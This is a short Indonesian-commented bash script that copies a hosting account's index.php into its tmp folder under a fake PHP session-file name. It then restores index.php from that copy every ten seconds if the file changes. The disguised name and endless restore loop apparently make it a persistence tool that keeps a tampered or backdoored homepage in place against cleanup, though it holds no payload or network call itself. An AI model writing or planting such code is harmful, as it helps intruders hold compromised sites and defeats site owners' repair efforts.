#!/bin/bash

# Definisikan lokasi file index.php
INDEX_FILE="/home/shirinba/public_html/index.php"
# Definisikan lokasi folder backup
BACKUP_FOLDER="/home/shirinba/tmp/"
# Buat folder backup jika belum ada
mkdir -p "$BACKUP_FOLDER"
# Tentukan nama file backup
BACKUP_FILE="$BACKUP_FOLDER/sess_07996f2a27e7566638b10befa7ed6bf11111"

# Backup file index.php jika belum ada backup
if [ ! -f "$BACKUP_FILE" ]; then
    cp "$INDEX_FILE" "$BACKUP_FILE"
    echo "Backup pertama dibuat: $BACKUP_FILE"
fi

# Fungsi untuk memonitor perubahan pada file index.php
monitor_file() {
    while true; do
        # Hitung checksum file index.php untuk mendeteksi perubahan
        CURRENT_CHECKSUM=$(md5sum "$INDEX_FILE" | awk '{ print $1 }')
        BACKUP_CHECKSUM=$(md5sum "$BACKUP_FILE" | awk '{ print $1 }')

        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            # Jika checksum berbeda, kembalikan file index.php dari backup
            echo "Perubahan terdeteksi pada index.php, mengembalikan backup..."
            cp "$BACKUP_FILE" "$INDEX_FILE"
            echo "index.php dikembalikan ke versi backup."
        fi

        # Tunggu 10 detik sebelum pengecekan selanjutnya
        sleep 10
    done
}

# Jalankan fungsi monitoring
monitor_file
